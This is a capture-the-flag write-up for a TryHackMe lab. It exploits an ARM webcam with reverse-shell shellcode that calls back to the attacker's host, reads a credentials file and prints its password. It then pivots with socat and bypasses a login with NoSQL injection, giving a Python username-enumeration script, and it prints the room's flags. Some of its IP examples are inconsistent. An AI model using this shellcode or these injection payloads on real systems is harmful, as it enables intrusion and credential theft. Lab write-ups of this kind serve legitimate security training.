
# Snowy ARMageddon
https://tryhackme.com/r/room/armageddon2r

## What is the content of the first flag?

I started with nmap:

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -p- 10.10.203.91 
PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown
```

The device at 10.10.203.91:50628 is a Webcamera. After googling a bit, I found a relevant blog post: [ARM-X Challenge: Breaking the webs | no-sec.net](https://no-sec.net/arm-x-challenge-breaking-the-webs/). The blog post contains an exploit that was used to gain a reverse shell on the same camera.

To create my own little-endian code from ARM assembly, I used this site: [Online Assembler and Disassembler](https://shell-storm.org/online/Online-Assembler-and-Disassembler).

This part of the ARM Assembly code needs to match with my IP. Let's break it down to understand what it means. I used the same IP as in the blog in this explanation.

```assembly
mov r1, #0x164
lsl r1, #8
add r1, #0xa8
lsl r1, #8
add r1, #0xc0
push {r1}       // 192.168.100.1
```

- `mov`: Move an immediate value into a register.
- `lsl`: Logical left shift, shifts the bits in a register to the left.
- `add`: Add an immediate value to a register.
- `push`: Push a register onto the stack.
- `#0x164`: Hexadecimal `164`, which in binaries is `0001 0110 0100`.

We can understand how this goes inside that R1 when we break it down to binaries.

| Details           | BYTE           | BYTE           | BYTE           | BYTE           |
|-------------------|----------------|----------------|----------------|----------------|
| **Starting point** | 0000 0000       | 0000 0000       | 0000 0000       | 0000 0000       |

The first command in the ARM is "`mov r1, #0x164`," which means `0001 0110 0100` in binaries and in decimals that is `1 & 100`. We can see that it goes into bytes as following:

|               | BYTE           | BYTE           | BYTE           | BYTE           |
|---------------|----------------|----------------|----------------|----------------|
|               | 0000 0000       | 0000 0000       | 0000 **0001**  | **0110 0100**  |
| **Decimals**  |                |                | 1              | 100            |

Then: `lsl r1, #8`. The instruction `lsl r1, #8` in ARM code left-shifts the value in register `r1` by 8 bits. After that, our register looks like this:

|               | BYTE           | BYTE           | BYTE           | BYTE           |
|---------------|----------------|----------------|----------------|----------------|
|               | 0000 0000       | **0000 0001**  | **0110 0100**  | 0000 0000       |
| **Decimals**  |                | 0              | 100            |                |

Let's add more to r1 register, `add r1, #0xa8`, which in binaries is `1010 1000` and in decimals, it's `168`.

|               | BYTE           | BYTE           | BYTE           | BYTE           |
|---------------|----------------|----------------|----------------|----------------|
|               | 0000 0001       | 0110 0100       | 1010 1000       | 1100 0000       |
| **Decimals**  |                | 1              | 100            | 168            |

Then: `lsl r1, #8` again.

|               | BYTE           | BYTE           | BYTE           | BYTE           |
|---------------|----------------|----------------|----------------|----------------|
|               | **0000 0001**  | **0110 0100**  | **1010 1000**  | 0000 0000       |
| **Decimals**  | 1              | 100            | 168            | 0              |

And next `add r1, #0xc0`, which in binaries is `1100 0000` and in decimals, it's `192`.

|               | BYTE           | BYTE           | BYTE           | BYTE           |
|---------------|----------------|----------------|----------------|----------------|
|               | 0000 0001       | 0110 0100       | 1010 1000       | **1100 0000**  |
| **Decimals**  | 1              | 100            | 168            | 192            |

In the end, we have `1.100.168.192`. In this firmware, byte order is little-endian, meaning that the bytes are stored in reverse order in memory. 

After modifying the ARM code to match my own IP, I can then assemble it to modify the python script. For example, if IP for THM is `10.8.232:221`, ARM code would look like this:

```assembly
mov r1, #221
lsl r1, #8
add r1, #232
lsl r1, #8
add r1, #8
lsl r1, #8
add r1, #8 (10 is "Bad character", you can read more about this in the blog)
add r1, #2 (So 8+2 becomes 10)
push {r1}
```

It is not needed to add your IP address as hexadecimals when you are assembling your code. As seen on blog post.

And here are the parts from the code I modified:

```python
HOST = '10.8.232:221' #Target IP
PORT = 50628 #Target port
LHOST = [10,8,231,222] #MY IP
LPORT = 4444 #PORT you want to use

MY IP Address:
SC +=b'\xdd\x10\xa0\xe3\x01\x14\xa0\xe1\xe8\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x01\x14\xa0\xe1\x08\x10\x81\xe2\x02\x10\x81\xe2\x04\x10\x2d\xe5'   # MODIFIED FOR IP 10.8.232:221

Target IP:
s = remote('10.10.203.91', 50628) # THM Target IP
```

Reverse shell in action:

```shell
─(kali㉿kali)-[~/Desktop/SQ2]
$ python3 armshellcode.py
[*] Shellcode length: 856
[+] Opening connection to 10.10.203.91 on port 50628: Done
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.203.91 on port 33156
[*] Switching to interactive mode
$ cat /etc/webs/umconfig.txt
TABLE=users

ROW=0
name=admin
password=Y3tiStarCur!ouspassword=admin
group=administrators
prot=0
disable=0
```

After logging into the site 10.10.203.91:50628, flag 1 is revealed.

![FLAG1](Images/camera.png)

First flag:

```
THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}
```

## What is the content of the `yetikey2.txt` file?

It is possible to use that Camera as a reverse proxy to gain access into `10.10.203.91:8080/login.php`. For that I used `socat`. The correct socat executable for ARM32 devices can be found [here](https://github.com/therealsaumil/static-arm-bins/blob/master/socat-armel-static).

I then uploaded the `socat` file to the camera with Python http.server.

![socat](Images/socat1.png)


`ps w | grep "webs"` to Find out what PID the webs app has. That is currently using port 50628, so I need to kill it before it is possible to create proxy.

`kill 20748`: This kills the process with ID 20748.

`./socat tcp-listen:50628,fork,reuseaddr tcp:10.10.203.91:8080`:This forwards port 50628 to 8080. You must run this command quickly after you have killed the webs process because it starts automatically.

After that, it is possible to access target website from `10.10.203.91:50628` instead of `8080`. It asks for HTML authentication, and I can use the credentials I got for the Camera.

![Login2](Images/login1.png)

I used Burp Suite and information found from [NoSQL injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection) to get the correct username and simple NoSQLi to log in with the correct user.

![burpsuite](Images/burpsuite.gif)

**`username[$ne]=haxor`**
- `username`: This is the field name or parameter for the username in the login form.
- `[$ne]`: This is a MongoDB query operator that stands for "not equal." It's used to filter documents where the value of the specified field is not equal to the specified value.
- `haxor`: This is the value you're testing. The injection attempt is trying to find a user whose username is not equal to "haxor."

**`password[$ne]=1`**
- `password`: This is the field name or parameter for the password in the login form.
- `[$ne]`: Again, this is the MongoDB "not equal" operator.
- `1`: This is the value you're testing for the password. The injection attempt is trying to find a user whose password is not equal to "1."

In a normal login scenario, the server would check if the provided username and password match the stored credentials. However, in cases of NoSQL injection, an attacker might manipulate these parameters to exploit vulnerabilities in the way the server processes them, potentially gaining unauthorized access or extracting information from the database.

After using "haxor" as the login name, I changed it to `Frostbite`, which was the first username retrieved from the database. That reveals username, `Snowballer`. Now I can extract all usernames to see if there are users with elevated privileges or additional information. I used a Python script to do that.

![nosqli](Images/nosqli.gif)

Here is the script I used to get all usernames in the database:
```python
import requests
import re

# Target URL for the enumeration
url = 'http://10.10.148.23:50628/'

# Error message to identify invalid username or password
error_message = 'Invalid username or password'

# Initial username and headers setup
usernames = ['Frostbite']
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Authorization': 'Basic YWRtaW46WTN0aVN0YXJDdXIhb3VzcGFzc3dvcmQ9YWRtaW4=' #Base64 login information, admin:Y3tiStarCur!ouspassword=admin

# First request to get a valid PHPSESSID
cookie_req = requests.get(url + 'login.php', headers=headers)
cookies = cookie_req.cookies.get_dict()

# Print a starting message
print('\nEnumeration started!\n')

# Payload and loop for username enumeration
while True:
    # Construct the payload for the current set of usernames
    usernames_payload = '&'.join(f'username[$nin][{i}]={username}' for i, username in enumerate(usernames))
    payload = f'{usernames_payload}&password[$ne]=1'

    # Send the login POST request
    r = requests.post(url + 'login.php', headers=headers, cookies=cookies, data=payload)
    res = r.text

    # Check if we get an error message
    if re.search(error_message, res):
        break

    # Fetch username we are logged in as and add it to the list
    new_username = re.search(r'Welcome (\w+)!', res).group(1)
    print('Username found:', new_username)
    usernames.append(new_username)

    # Logout of the account to enable further login attempts
    requests.get(url + '/logout.php', cookies=cookies, headers=headers)

# Print the final results with each username on a new line
print('\nEnumeration complete!')
```
And next, lets login as `Frosteau` to reveal yetikey2.txt.

![Frosteau](Images/frosteau.gif)



The content of `yetikey2.txt` is `2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK`.
